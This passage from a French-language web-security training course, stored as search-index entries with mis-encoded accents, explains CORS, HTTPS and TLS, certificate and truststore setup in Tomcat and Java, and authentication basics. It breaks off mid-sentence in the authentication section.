:\n J\u0026rsquo;arrive sur un site pirate, qui dÃ©clenche un script rÃ©cupÃ©rant une information sur le site cible, par exemple un site interne inaccessible d\u0026rsquo;Internet. L\u0026rsquo;information est ainsi chargÃ©e sur la page et la suite du script peut par exemple la renvoyer au pirate.  Contre-attaque :\n Seul le navigateur sait le site rÃ©el oÃ¹ il a rÃ©cupÃ©rÃ© le site Sur tout navigateur (rÃ©cent), un script Ã©xÃ©cutÃ© par le client et appelant une ressource externe effectuera une vÃ©rification CORS =\u0026gt; La requÃªte ne fonctionnera que si le site externe renvoit un entÃªte Access-Control-Allow-Origin correspond au domaine du site source  Le site dit : voici l\u0026rsquo;url des sites qui peuvent m\u0026rsquo;appeler\nLes navigateurs envoient systÃ©matiquement et automatiquement l\u0026rsquo;entÃªte Origin (Ã  moins d\u0026rsquo;utiliser Netscape 8 ou IE 6)\nLe navigateur n\u0026rsquo;autorise pas la modification de cet entete par script\n  Pour les requÃªtes GET et POST \u0026ldquo;simple\u0026rdquo;, supposÃ©es sans effets de bord (application/x-www-form-urlencoded,multipart/form-data,text/plain) : la requÃªte est directement envoyÃ©e mais le rÃ©sultat ne s\u0026rsquo;affiche qu\u0026rsquo;en cas de validation de CORS\n  Pour les autres requÃªtes (avec effets de bord), le navigateur envoie prÃ©alablement une requÃªte OPTION, vÃ©rifie CORS, et n\u0026rsquo;exÃ©cute la requÃªte qu\u0026rsquo;en cas de validation\n  !!! Les navigateurs vont maintenant plus loin et font la mÃªme vÃ©rification OPTION pour ces requÃªtes\n  C\u0026rsquo;est donc le serveur qui a la charge de lire l\u0026rsquo;entÃªte Origin, de rÃ©pondre ou non selon le contenu\n  Le serveur DOIT ajouter l\u0026rsquo;entete Access-Control-Allow-Origin en cas de succÃ¨s\n  Par dÃ©faut un serveur ne va bien sÃ»r rien renvoyer et sera donc impossible Ã  appeler par script\n  On peut envisager de renvoyer Access-Control-Allow-Origin: * si le site ne fournit que des donnÃ©es publiques non sensibles\n  Domaine au sens CORS :\n  Un domaine signifie dans ce contexte un triplet (protocole, nom de domaine, port).\n  http://localhost:8080 n\u0026rsquo;est pas le mÃªme domaine que https://localhost:8443 et le domaine https://localhost (sous entendu port 443) est encore diffÃ©rent\n  Un script lance une requÃªte vers un autre domaine que celui oÃ¹ il est exÃ©cutÃ©, typiquement via un XMLHttpRequest().\n  Le navigateur ajoute l\u0026rsquo;entete Origin Ã  la requÃªte\n  Cet entÃªte n\u0026rsquo;est pas modifiable par script\n  Origin: https://localhost:8443    Le serveur recoit la requete et peut contrÃ´ler la prÃ©sence de Origin s\u0026rsquo;il s\u0026rsquo;attend Ã  de telles requÃªtes via script\n  Le serveur possÃ¨de un certain nombre de domaine autorisÃ©s Ã  le contacter par script et potentiellement tous (*)\n  Le serveur peut bloquer la requÃªte si elle ne correspond pas Ã  ses domaines autorisÃ©s\n  Si le serveur choisit de rÃ©pondre et qu\u0026rsquo;il est configurÃ© pour, il ajoute un ou plusieurs entÃªtes Access-Control-Allow-Origin :\n  Access-Control-Allow-Origin: https://localhost:8443 Access-Control-Allow-Origin: http://localhost:8080   S\u0026rsquo;il accepte n\u0026rsquo;importe quel requÃªte issue d\u0026rsquo;un script :  Access-Control-Allow-Origin: *   Le navigateur lit la rÃ©ponse du serveur Si elle ne contient pas d\u0026rsquo;entÃªte Access-Control-Allow-Origin ou qu\u0026rsquo;aucun entÃªte Access-Control-Allow-Origin ne correspond au domaine source, le navigateur ne retourne rien au script. Le script ne fait pas la difference entre un echec de connexion et une erreur cors  Gestion des erreurs :\n Pour debugger, la console du navigateur vous prÃ©vient que la rÃ©ponse a Ã©tÃ© bloquÃ©e  Test :\n\u0026lt;script\u0026gt; var testCors = function () { var req = new XMLHttpRequest() req.open('GET', 'https://insee.fr/fr/accueil', false); req.send(); } \u0026lt;script\u0026gt; \u0026lt;button onClick=\u0026quot;testCors();\u0026quot;\u0026gt;Test CORS KO\u0026lt;/button\u0026gt;   var testCors = function () { var req = new XMLHttpRequest() req.open('GET', 'https://insee.fr/fr/accueil', false); req.send(); }  Test CORS KO\n  Attention Ã  l\u0026rsquo;autorisation globale (elle peut parfois Ãªtre nÃ©cessaire cependant) : Access-Control-Allow-Origin: *\n  L\u0026rsquo;idÃ©al est de controler cÃ´tÃ© serveur l\u0026rsquo;entete \u0026ldquo;Origin\u0026rdquo; et de personnaliser l\u0026rsquo;entete \u0026ldquo;Access-Control-Allow-Origin\u0026rdquo; si on accepte\n  Le dÃ©tails complet de CORS ici : https://developer.mozilla.org/fr/docs/Web/HTTP/CORS\n  Il faut garder Ã  l\u0026rsquo;esprit que CORS est une sÃ©curitÃ© cÃ´tÃ© client pour l\u0026rsquo;empÃ©cher de faire n\u0026rsquo;importe quoi malgrÃ© lui : fournir Ã  un script une information que le serveur n\u0026rsquo;a pas prÃ©vu d\u0026rsquo;Ãªtre utilisÃ©e par un script.\n  "}).add({id:8,href:"/docs/https/fonctionnement/",title:"Fontionnement de https",description:"Les grands principes #  HTTP protocole purement applicatif \u0026ldquo;Web\u0026rdquo; : toutes donnÃ©es Ã©changÃ©es sont en clair Protocole SSL ou TLS (le nom dÃ©pend de la version) : gestion d\u0026rsquo;un tunnel sÃ©curisÃ© Des protocoles purement fonctionnels (HTTP,FTP,SMTP,\u0026hellip;) peuvent se sÃ©curiser simplement en s\u0026rsquo;Ã©changeant dans un tunnel SSL HTTPS = HTTP + SSL  Proposer HTTPS sur un serveur #  Avoir un listener dÃ©diÃ© au HTTPS (sur le port 443 dans une configuration standard) : le HTTPS est \u0026ldquo;implicite\u0026rdquo; Avoir une configuration HTTPS minimale, soit un couple clÃ© privÃ©e/clÃ© publique  Echange sÃ©curisÃ© #  Les deux parties, client et serveur, doivent se mettre d\u0026rsquo;accord sur une clÃ© symÃ©trique Il existe des mÃ©thode pour communiquer sur un rÃ©seau en clair une clÃ© symÃ©trique secrÃ¨te, qui sera en fait partiellement gÃ©nÃ©rÃ© par les deux parties (Algorithme de Diffie-Hellman)  sequenceDiagram participant C as TLS Client participant S as TLS Serveur C-\u0026gt;\u0026gt;S: Client Hello note over C,S: Bonjour, \u0026lt;br/\u0026gt; je supporte les versions de TLS \u0026lt;br/\u0026gt; et les algorithmes suivants : \u0026lt;br/\u0026gt; .",content:"Les grands principes #  HTTP protocole purement applicatif \u0026ldquo;Web\u0026rdquo; : toutes donnÃ©es Ã©changÃ©es sont en clair Protocole SSL ou TLS (le nom dÃ©pend de la version) : gestion d\u0026rsquo;un tunnel sÃ©curisÃ© Des protocoles purement fonctionnels (HTTP,FTP,SMTP,\u0026hellip;) peuvent se sÃ©curiser simplement en s\u0026rsquo;Ã©changeant dans un tunnel SSL HTTPS = HTTP + SSL  Proposer HTTPS sur un serveur #  Avoir un listener dÃ©diÃ© au HTTPS (sur le port 443 dans une configuration standard) : le HTTPS est \u0026ldquo;implicite\u0026rdquo; Avoir une configuration HTTPS minimale, soit un couple clÃ© privÃ©e/clÃ© publique  Echange sÃ©curisÃ© #  Les deux parties, client et serveur, doivent se mettre d\u0026rsquo;accord sur une clÃ© symÃ©trique Il existe des mÃ©thode pour communiquer sur un rÃ©seau en clair une clÃ© symÃ©trique secrÃ¨te, qui sera en fait partiellement gÃ©nÃ©rÃ© par les deux parties (Algorithme de Diffie-Hellman)  sequenceDiagram participant C as TLS Client participant S as TLS Serveur C-\u0026gt;\u0026gt;S: Client Hello note over C,S: Bonjour, \u0026lt;br/\u0026gt; je supporte les versions de TLS \u0026lt;br/\u0026gt; et les algorithmes suivants : \u0026lt;br/\u0026gt; .......... S-\u0026gt;\u0026gt;C: Server Hello note over C,S: Bonjour, \u0026lt;br/\u0026gt; parmi les versions et algorithme que je supporte, \u0026lt;br/\u0026gt; nous allons utiliser TLS 1.2 et cet algorithme : \u0026lt;br/\u0026gt; TLS_DHE_RSA_WITH_AES_256_CBC_SHA note over C,S: Voici mon certificat : ....... opt note over C,S: J\u0026#39;aurai besoin d\u0026#39;un certificat Ã  ton nom \u0026lt;br/\u0026gt; pour t\u0026#39;authentifier end C-\u0026gt;\u0026gt;C: Controle du certificat note over C: Nom valide ? \u0026lt;br/\u0026gt; Date valide ? \u0026lt;br/\u0026gt; AC reconnue ? C-\u0026gt;\u0026gt;S: PrÃ©paration clÃ© (Diffie-Hellman) note over C,S: chiffrÃ©e avec clÃ© publique serveur S-\u0026gt;\u0026gt;S: DÃ©chiffrement avec clÃ© privÃ©e note over S: Fait office de challenge response opt S-\u0026gt;\u0026gt;S: Controle Certif client le cas Ã©chÃ©ant S-\u0026gt;\u0026gt;C: Challenge C-\u0026gt;\u0026gt;S: Challenge response end S-\u0026gt;\u0026gt;C: Finalisation Diffie-Hellman note over C,S: Le client et le serveur \u0026lt;br/\u0026gt; se sont partagÃ© une clÃ© symÃ©trique \u0026lt;br/\u0026gt; Ã  usage unique Ã  cette communication C-\u0026gt;\u0026gt;S: OK, next encrypted S-\u0026gt;\u0026gt;C: OK, next encrypted loop C-\u0026gt;\u0026gt;S: encrypted {get /resource/} S-\u0026gt;\u0026gt;C: encrypted {reponse HTTP} end  La clÃ© symÃ©trique est jetable, non stockÃ©e en dehors de cette Ã©change, elle ne peut donc pas Ãªtre compromise par la suite. On parle de confidentialitÃ© persistente ou PFS (Perfect Forward Secrecy)\nControle d\u0026rsquo;identitÃ© et autoritÃ© de confiance #  A quoi sert la clÃ© asymÃ©trique alors ? ProblÃ¨me du \u0026ldquo;Man in the middle\u0026rdquo;  \u0026ldquo;Information invisible par un tiers\u0026rdquo;\u0026hellip; Encore faut il maÃ®triser les deux parties Le client doit savoir qui il est en train de contacter Le serveur propose un certificat contenant principalement son nom : l\u0026rsquo;url que l\u0026rsquo;utilisateur a demandÃ© sa clÃ© publique la signature de ces informations par une autoritÃ© de confiance    L\u0026rsquo;autoritÃ© de confiance ?\n C\u0026rsquo;est un organisme qui signe avec sa clÃ© privÃ©e les informations du serveur On peut donc vÃ©rifier avec la clÃ© publique de l\u0026rsquo;AC si informations et signature correspondent Pour rÃ©cupÃ©rer la clÃ© publique de l\u0026rsquo;AutoritÃ© de confiance, on consulte son\u0026hellip; Certificat ! \u0026hellip; Mais comment vÃ©rifier son certificat ? Le certificat d\u0026rsquo;une AC est autosignÃ©e, le navigateur est configurÃ© pour accepter un certain nombre L\u0026rsquo;insee est une AC reconnue en interne uniquement Les applis Internet sont signÃ©es par une AC externe reconnue dans le monde entier (intÃ©grÃ©e sur les navigateurs connus)  DÃ©lÃ©guer HTTPS #   L\u0026rsquo;application ne gÃ¨re pas le HTTPS, c\u0026rsquo;est le serveur applicatif (tomcat) ou un Ã©quipement rÃ©seau supÃ©rieur qui en a la charge\n  L\u0026rsquo;application peut imposer l\u0026rsquo;utilisation du HTTPS\n  Dans tous les cas c\u0026rsquo;est le serveur applicatif (tomcat) qui a la charge de dÃ©terminer si la connexion entrante est sÃ©curisÃ©e\n  Cas direct : c\u0026rsquo;est tomcat qui gÃ¨re lui mÃªme la connexion ssl\n  Cas indirect : tomcat ne gÃ¨re pas de connexion HTTPS mais il sait que la connexion initiale est en HTTPS (cas d\u0026rsquo;un reverse proxy)\n  Si le connecteur gÃ¨re la connexion ssl ou qu\u0026rsquo;il est dÃ©diÃ© Ã  recevoir des connexions sÃ©curisÃ©es, on peut directement le spÃ©cifier sÃ©curisÃ©.\n  Sinon, il va falloir dÃ©finir un profil de requÃªtes sÃ©curisÃ©es\n  RÃ©partiteur de charge dÃ©chiffrant #  Architecture Load Balancer qui porte les certificats (et donc gÃ¨re la connexion HTTPS) Le load balancer dÃ©chiffre et transmet une requÃªte HTTP (en clair) au serveur applicatif portant l\u0026rsquo;application  Transfert de l\u0026rsquo;information HTTPS\n  Pour savoir que la requÃªte initiale est en HTTPS, le load balancer ajoute un entÃªte \u0026ldquo;X-Forwarded-Proto: https\u0026rdquo;\n  On va ensuite configurer notre serveur applicatif (tomcat) pour que la lecture de cet entÃªte signifie \u0026ldquo;La connexion initiale Ã©tait sÃ©curisÃ©\u0026rdquo;\n  \u0026lt;Valve className=\u0026quot;org.apache.catalina.connector.RemoteIpValve\u0026quot; protocolHeader=\u0026quot;X-Forwarded-Proto\u0026quot; /\u0026gt;   Une valve Tomcat est une classe exÃ©cutÃ©e (invoke()) Ã  l\u0026rsquo;arrivÃ©e de chaque requÃªte. C\u0026rsquo;est le mÃªme fonctionnement que les filtre JavaEE/JakartaEE\n Vraiment forcer le HTTPS #  Niveau applicatif pour controle Ã©ventuellement Niveau Frontal (Load Balancer) : Ã©couter en http sur le port 80 mais uniquement pour rediriger vers https DÃ©claratif Indiquer au navigateur de ne plsu utiliser que HTTPS : en-tÃªte HSTS  Strict-Transport-Security \u0026quot;max-age=31536000\u0026quot;  La configuration ne sera activÃ©e par le navigateur que s\u0026rsquo;il y a eu une premiÃ¨re fois une commication sÃ©curisÃ©e correctement ! =\u0026gt; Validation ok du certificat\nLe truststore # On va spÃ©cifier un peu plus l\u0026rsquo;Ã©tape \u0026ldquo;VÃ©rification du certificat serveur\u0026rdquo;\n  Mon application doit se connecter Ã  une autre application (web-service)\n  Je souhaite que cet appel soit en https (au fond justifiÃ© que si la connexion entre les deux serveurs passent par Internet)\n  Lors d\u0026rsquo;une connexion HTTPS, Java vÃ©rifie si le certificat distant est valide\n  C\u0026rsquo;est ce que fait le navigateur quand on se connecte Ã  un site\n  Si le certificat n\u0026rsquo;est pas valide (expirÃ©, non associÃ© au domaine, non signÃ© par une autoritÃ© de confiance), le navigateur me le signale et je choisit de prendre le risque ou non de me connecter au site.\n  Dans l\u0026rsquo;appli, Java refusera systÃ©matiquement la connexion\n  Date d\u0026rsquo;expiration, mauvais nom : je ne peux rien faire, il faut que le certificat soit cohÃ©rent\n  AutosignÃ© ? Je peux dire Ã  Java que le signataire du certificat est valide, en d\u0026rsquo;autres termes, je lui dÃ©finis une autoritÃ© de confiance\n  (Il existe la possibilitÃ© de crÃ©er une classe faisant que Java ne fait plus aucun contrÃ´le sur le certificat mais c\u0026rsquo;est mal)\n  Il faut crÃ©er un truststore contenant l\u0026rsquo;ensemble des certificats Ã  valider (= ce que l\u0026rsquo;on considÃ¨re AC)\n  Https sur une application javascript #  On peut toujours dÃ©lÃ©guer le https Ã  un Ã©quipement frontal rÃ©seau A noter que l\u0026rsquo;Ã©change sÃ©curisÃ© permet donc ici de garantir l\u0026rsquo;Ã©change correcte du code source, il est donc indispensable que l\u0026rsquo;utilisateur soit redirigÃ© au plus tÃ´t vers https  On peut Ã©ventuellement forcer le https au sein de l\u0026rsquo;application, mÃªme si c\u0026rsquo;est un peu tard\u0026hellip;\n L\u0026rsquo;application s\u0026rsquo;Ã©xÃ©cute chez le client, pour forcer le https, il faut donc raisonner cÃ´tÃ© client Si l\u0026rsquo;application JS veut s\u0026rsquo;assurer de passer en HTTPS, elle doit vÃ©rifier le window.location du client et Ã©ventuellement le rediriger.  if ( typeof window !== 'undefined' \u0026amp;\u0026amp; window.location \u0026amp;\u0026amp; window.location.protocol === 'http:' ) { window.location.href = window.location.href.replace( /^http(?!s)/, 'https' ); }  Pour lancer une application \u0026ldquo;create-react-app\u0026rdquo; en https en local (par defaut http) :\n Au lieu de npm start Lancer set HTTPS=true\u0026amp;\u0026amp;npm start  Https sur les application javascript : cas du back-end mal signÃ© Un front-end JavaScript effectue des appels Ã  son backend.\nDans la pratique, c\u0026rsquo;est le navigateur qui effectue ces requetes, et si le certificat du backend ne convient pas au navigateur, la requete va Ãªtre rejetÃ©e.\n Solution 1 : Faire en sort que le backend ait un certificat signÃ© par l\u0026rsquo;Insee Solution 2 : se connecter manuellement une fois au backend, accepter l\u0026rsquo;alerte de sÃ©curitÃ© du navigateur  "}).add({id:9,href:"/docs/https/pratique/",title:"Mise en pratique de https",description:"Comment faire en local\n Il n\u0026rsquo;est pas nÃ©cessaire d\u0026rsquo;avoir un certificat signÃ© par une autoritÃ© de confiance Un certificat autosignÃ© suffit : c\u0026rsquo;est un certificat \u0026ldquo;localhost\u0026rdquo; signÃ© par \u0026ldquo;localhost\u0026rdquo;  GÃ©nÃ©rer un certificat # Les Ã©tapes :\n GÃ©nÃ©rer une clÃ© privÃ©e Calculer la clÃ© publique Ã  partir de la clÃ© privÃ©e Enrober la clÃ© publique dans une demande de certificat Signer la demande de certificat (facultatif) GÃ©nÃ©rer le bon format d\u0026rsquo;Ã©change  Qui signe ?",content:"Comment faire en local\n Il n\u0026rsquo;est pas nÃ©cessaire d\u0026rsquo;avoir un certificat signÃ© par une autoritÃ© de confiance Un certificat autosignÃ© suffit : c\u0026rsquo;est un certificat \u0026ldquo;localhost\u0026rdquo; signÃ© par \u0026ldquo;localhost\u0026rdquo;  GÃ©nÃ©rer un certificat # Les Ã©tapes :\n GÃ©nÃ©rer une clÃ© privÃ©e Calculer la clÃ© publique Ã  partir de la clÃ© privÃ©e Enrober la clÃ© publique dans une demande de certificat Signer la demande de certificat (facultatif) GÃ©nÃ©rer le bon format d\u0026rsquo;Ã©change  Qui signe ?\n Une autoritÃ© payante Let\u0026rsquo;s encrypt Nous-mÃªme dans le cadre de l\u0026rsquo;exercice ! Certifcat dit autosignÃ©, ici gÃ©nÃ©rÃ© pour localhost, signÃ© par localhost  # On gÃ©nÃ¨re une clÃ© privÃ©e openssl genrsa 2048 \u0026gt; server.key  # On gÃ©nÃ¨re la clÃ© publique associÃ© Ã  la clÃ© privÃ©e, et on prÃ©pare la demande de certificat openssl req -new -key server.key -out server.csr  \u0026gt; Country Name (2 letter code) [AU]:FR \u0026gt; State or Province Name (full name) [Some-State]:France \u0026gt; Locality Name (eg, city) []:Paris \u0026gt; Organization Name (eg, company) [Internet Widgits Pty Ltd]:Insee \u0026gt; Organizational Unit Name (eg, section) []:CNIP \u0026gt; Common Name (e.g. server FQDN or YOUR name) []:localhost \u0026gt; Email Address []: \u0026gt; Please enter the following 'extra' attributes \u0026gt; to be sent with your certificate request \u0026gt; A challenge password []: \u0026gt; An optional company name []:  # On fait signer la demande par l'AC qui ici est localhost lui-mÃªme openssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt  # Si on veut transformer en keystore openssl pkcs12 -export -in server.crt -inkey server.key -out server.p12 -passout pass:changeit  Installation sur tomcat # Configuration des ports d\u0026rsquo;Ã©coute : dans le server.xml :\nAjout d\u0026rsquo;un connecteur SSL #  tomcat \u0026lt;=9  \u0026lt;Connector port=\u0026quot;8443\u0026quot; protocol=\u0026quot;org.apache.coyote.http11.Http11NioProtocol\u0026quot; maxThreads=\u0026quot;150\u0026quot; SSLEnabled=\u0026quot;true\u0026quot; scheme=\u0026quot;https\u0026quot; secure=\u0026quot;true\u0026quot; clientAuth=\u0026quot;false\u0026quot; sslProtocol=\u0026quot;TLS\u0026quot; keystoreFile=\u0026quot;${catalina.home}/conf/ssl/server.p12\u0026quot; keystoreType=\u0026quot;pkcs12\u0026quot; keystorePass=\u0026quot;changeit\u0026quot; /\u0026gt;   tomcat \u0026gt;=10  \u0026lt;Connector port=\u0026quot;8443\u0026quot; protocol=\u0026quot;org.apache.coyote.http11.Http11Nio2Protocol\u0026quot; maxThreads=\u0026quot;20\u0026quot; SSLEnabled=\u0026quot;true\u0026quot; scheme=\u0026quot;https\u0026quot; secure=\u0026quot;true\u0026quot; defaultSSLHostConfigName=\u0026quot;test\u0026quot;\u0026gt; \u0026lt;SSLHostConfig hostName=\u0026quot;test\u0026quot; protocols=\u0026quot;TLSv1.2\u0026quot; \u0026gt; \u0026lt;Certificate certificateFile=\u0026quot;${catalina.home}/conf/ssl/server.crt\u0026quot; certificateKeyFile=\u0026quot;${catalina.home}/conf/ssl/server.key\u0026quot; /\u0026gt; \u0026lt;/SSLHostConfig\u0026gt; \u0026lt;/Connector\u0026gt;  Configuration de la redirection du connecteur par dÃ©faut # On dÃ©finie le port de redirection dans le cas ou une redirection https est imposÃ©e par l\u0026rsquo;application\nCe connecteur existe dÃ©jÃ  par dÃ©faut, il faut uniquement changer le port de redirection si nÃ©cessaire\n\u0026lt;Connector connectionTimeout=\u0026quot;20000\u0026quot; port=\u0026quot;8080\u0026quot; protocol=\u0026quot;HTTP/1.1\u0026quot; redirectPort=\u0026quot;8443\u0026quot;/\u0026gt;  Rendre le https obligatoire # web.xml (Tomcat)\n\u0026lt;security-constraint\u0026gt; \u0026lt;display-name\u0026gt;tout-en-https\u0026lt;/display-name\u0026gt; \u0026lt;web-resource-collection\u0026gt; \u0026lt;web-resource-name\u0026gt;tout\u0026lt;/web-resource-name\u0026gt; \u0026lt;url-pattern\u0026gt;/*\u0026lt;/url-pattern\u0026gt; \u0026lt;/web-resource-collection\u0026gt; \u0026lt;user-data-constraint\u0026gt; \u0026lt;transport-guarantee\u0026gt;CONFIDENTIAL\u0026lt;/transport-guarantee\u0026gt; \u0026lt;/user-data-constraint\u0026gt; \u0026lt;/security-constraint\u0026gt;  Spring Security\n@Configuration @EnableWebSecurity public class MySecurityConfiguration { @Bean public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception { http.requiresChannel().anyRequest().requiresSecure(); } }  TP #  GÃ©nÃ©rer un keystore pour une configuration https de localhost Mettre en place https sur un serveur local Forcer le https sur l\u0026rsquo;application  Le truststore en java #   Par dÃ©faut le trustore chargÃ© est celui de la jvm Ã©xÃ©cutant l\u0026rsquo;application (\u0026hellip;.\\mon-jdk\\lib\\security\\cacerts)\n  Le mot de passe par dÃ©faut est changeit\n  On peut vouloir un \u0026ldquo;Insee flavored cacert\u0026rdquo; : le cacerts disponible dans la distribution java plus la chaine de certification Insee (AC Racine + AC SubordonnÃ©e)\n  Au cas oÃ¹ : certificats AC Insee\n  Pour le changer on utilise des paramÃ¨tres de la JVM :\n javax.net.ssl.trustStrore javax.net.ssl.trustStorePassword javax.net.ssl.trustStoreType (par dÃ©faut jks)    On crÃ©e un nouveau truststore, en pratique on ajoute nos certificats au truststore par dÃ©faut\n  CrÃ©er le truststore\n  keytool -import -trustcacerts -file server.crt -alias localhost -keystore cacertsperso  Si keytool inconnu : (Ã  ajouter au path pour plus de simplicitÃ©)\n\u0026quot;path/to/mon-jdk/bin/keytool.exe\u0026quot; \u0026quot;$JAVA_HOME/bin/keytool.exe\u0026quot;  CrÃ©e le truststore si cacertsperso n\u0026rsquo;existe pas encore, ajoute le certificat aux existants s\u0026rsquo;il existe dÃ©jÃ \n Le dÃ©clarer au dÃ©marrage :  ParamÃ¨tres de dÃ©marrage    -Djavax.net.ssl.trustStore=\u0026quot;/path/to/cacerts.jks\u0026quot; -Djavax.net.ssl.trustStorePassword=changeit -Djavax.net.ssl.trustStoreType=JKS -Djavax.net.debug=all (UNIQUEMENT pour debugger en cas de problÃ¨me, c'est TRES verbeux)   Dans le code :  System.setProperty(\u0026quot;javax.net.ssl.trustStore\u0026quot;, \u0026quot;/path/to/cacerts.jks\u0026quot;); System.setProperty(\u0026quot;javax.net.ssl.trustStorePassword\u0026quot;, \u0026quot;changeit\u0026quot;); System.setProperty(\u0026quot;javax.net.ssl.trustStoreType\u0026quot;, \u0026quot;JKS\u0026quot;);  TP #  CrÃ©er un truststore incluant le cacert Insee et le certificat gÃ©nÃ©rÃ© prÃ©cÃ©demment Le faire prendre en compte dans l\u0026rsquo;application  "}).add({id:10,href:"/docs/authentification/principes/",title:"Les grands principes de l'authentification",description:"3 # Authentification # Qu\u0026rsquo;est qu\u0026rsquo;une personne authentifiÃ©e #  Une personne connue de l\u0026rsquo;application Elle est donc enregistrÃ©e Comment stocker cette information ? Type de base de donnÃ©e dÃ©diÃ©e : l\u0026rsquo;annuaire  Qu\u0026rsquo;est que l\u0026rsquo;authentification #  Validation d\u0026rsquo;une identification Un utilisateur doit indiquer qui il est (identifiant, certificat client) et le prouver (mot de passe, certifcat client, carte Ã  puce, code Ã  usage unique, empreinte digitale) Au moins un facteur, mais plusieurs facteurs simultanÃ©s amÃ©liorent la preuve (mot de passe + carte Ã  puce)  Le SSO - Single Sign On #  S\u0026rsquo;identifier une seule fois pour accÃ©der Ã  plusieurs services SystÃ¨me d\u0026rsquo;authentification centralisÃ© Question du SLO  Logout = dÃ©connexion de l\u0026rsquo;application uniquement ?",content:"3 # Authentification # Qu\u0026rsquo;est qu\u0026rsquo;une personne authentifiÃ©e #  Une personne connue de l\u0026rsquo;application Elle est donc enregistrÃ©e Comment stocker cette information ? Type de base de donnÃ©e dÃ©diÃ©e : l\u0026rsquo;annuaire  Qu\u0026rsquo;est que l\u0026rsquo;authentification #  Validation d\u0026rsquo;une identification Un utilisateur doit indiquer qui il est (identifiant, certificat client) et le prouver (mot de passe, certifcat client, carte Ã  puce, code Ã  usage unique, empreinte digitale) Au moins un facteur, mais plusieurs facteurs simultanÃ©s amÃ©liorent la preuve (mot de passe + carte Ã  puce)  Le SSO - Single Sign On #  S\u0026rsquo;identifier une seule fois pour accÃ©der Ã  plusieurs services SystÃ¨me d\u0026rsquo;authentification centralisÃ© Question du SLO  Logout = dÃ©connexion de l\u0026rsquo;application uniquement ? Ou dÃ©connexion de l\u0026rsquo;application et du fournisseur d\u0026rsquo;identitÃ© ? Ou encore, de l\u0026rsquo;application, du fournisseur, et de toutes les autres applis s\u0026rsquo;Ã©tant connectÃ©es via le fournisseur ?    Annuaire # RÃ©fÃ©rentiel permettant de stocker des donnÃ©es de maniÃ¨re hiÃ©rarchique et offrant des mÃ©canismes pour rechercher efficacement l\u0026rsquo;information.\n Recensement des informations sur les utilisateurs, sur les applications, sur un parc informatique Authentifier un utilisateur Donner un droit d\u0026rsquo;un objet sur un autre, gestion de groupes (hierarchie)  Technologies d\u0026rsquo;annuaires #  OpenLDAP : projet opensource Active Directory (AD) : solution Microsoft.  Ressource authentifiÃ© # Les besoins d\u0026rsquo;authentification sont variÃ©s.\nUne application peut proposer :\n Du contenu public (donc sans authentification) Du contenu accessible Ã  n\u0026rsquo;importe quel utilisateur authentifiÃ© Du contenu accessible Ã  certains utilisateurs  Ressource authentifiÃ© #  Authentification explicite : je prÃ©sente un en-tÃªte \u0026ldquo;Authorization\u0026rdquo; dans ma requÃªte Authentification implicite : je m\u0026rsquo;attends Ã  ce que l\u0026rsquo;application me donne un moyen de m\u0026rsquo;authentifier  Ressource authentifiÃ© # En arrivant sur une page oÃ¹ je suis censÃ© Ãªtre authentifiÃ©\n Je prÃ©sente un header \u0026ldquo;Authorization\u0026rdquo; ? Si oui et que l\u0026rsquo;application l\u0026rsquo;accepte je suis authentifiÃ© Sinon, l\u0026rsquo;application peut me proposer des moyens de m\u0026rsquo;authentifier S\u0026rsquo;il n\u0026rsquo;y a pas d\u0026rsquo;autres moyens que le header Authorization ou que j\u0026rsquo;ai dÃ©jÃ  tentÃ© tous les modes possibles sans succÃ¨s, je reÃ§ois dÃ©finitivement une erreur 401 \u0026ldquo;Unauthorized\u0026rdquo;  Ressource authentifiÃ© # Si un ou plusieurs autre modes de connexion sont disponibles, les fonctionnements sont variÃ©s :\n 401 + WWW-Authenticate header : le navigateur doit savoir rÃ©agir 200 + traitements divers ou 30X : redirection vers page de login ou vers un fournisseur d\u0026rsquo;identitÃ©  Ressource authentifiÃ© #  Exemple : l\u0026rsquo;authentification Basic  Authorization: Basic Base64(identifiant:motdepasse)   Si un site propose l\u0026rsquo;authentification Basic, et que l\u0026rsquo;on vient sans l\u0026rsquo;entÃªte authorisation, le site rÃ©pond avec l\u0026rsquo;entÃªte :  WWW-Authenticate: Basic realm=\u0026quot;nom d'affichage\u0026quot;   Le navigateur voyant cet entÃªte affiche Ã  l\u0026rsquo;utilisateur une pop-up demandant un identifiant et mot de passe et ayant pour titre le \u0026ldquo;nom d\u0026rsquo;affichage\u0026rdquo; Le navigateur utilisera ce couple identifiant mot de passe pour former l\u0026rsquo;en-tÃªte Authorisation tout le reste de la session  Ressource authentifiÃ© # Je suis correctement identifiÃ© mais la ressource ne s\u0026rsquo;adresse qu\u0026rsquo;Ã  un certain type d\u0026rsquo;utilisateur dont je ne fais pas partie :\n Erreur 403 Forbidden  Rappel code rÃ©ponse HTTP : #  20X : succÃ¨s 30X : redirection 40X : erreur cÃ´tÃ© Client Web 50X : erreur cÃ´tÃ© Serveur Web  Rappel code rÃ©ponse HTTP : #  200 : OK 301 : Moved Permanently 302 : Found (DÃ©placÃ© temporairement) 400 : Bad Request 401 : Unauthorized 403 : Forbidden 404 : Not Found 418 : Iâ€™m a teapot (RFC 2324) 500 : Internal Server Error 503 : Service Unavailable : rÃ©ponse fournie par un reverse proxy si l\u0026rsquo;application n\u0026rsquo;est pas disponible (maintenance par exemple)  Rappel code rÃ©ponse HTTP : # 401 ou 403 ?\n 401 : Unauthorized : L\u0026rsquo;authentification ne s\u0026rsquo;est pas dÃ©rolÃ©e comme prÃ©vue ou elle s\u0026rsquo;est bien dÃ©roulÃ©e mais l\u0026rsquo;utilisateur est inconnu de l\u0026rsquo;application 403 : Forbidden : L\u0026rsquo;authentification s\u0026rsquo;est bien dÃ©roulÃ©e et l\u0026rsquo;utilisateur est connu mais il n\u0026rsquo;a pas les habilitations nÃ©cessaires  Comment savoir si l\u0026rsquo;utilisateur a les droits ? # Le mode d\u0026rsquo;authentification peut simplement prÃ©senter une identifiation. C\u0026rsquo;est alors Ã  moi de dÃ©terminer si l\u0026rsquo;utilisateur a le droit d\u0026rsquo;accÃ©der Ã  la ressource et d\u0026rsquo;afficher les bonnes informations.\nM Robichu se connecte Ã  mon questionnaire en ligne.\nIl a pu s\u0026rsquo;authentifier correctement sur l\u0026rsquo;application, la seule information connue de l\u0026rsquo;application est alors son identifiant.\nL\u0026rsquo;application recherche en base de donnÃ©es l\u0026rsquo;identifiant de M Robichu et rÃ©cupÃ¨re bien une ligne qui contient notamment les informations dÃ©jÃ  renseignÃ©es par M Robichu.\nJe sais donc que M Robichu a les droits sur l\u0026rsquo;application et je peux en plus 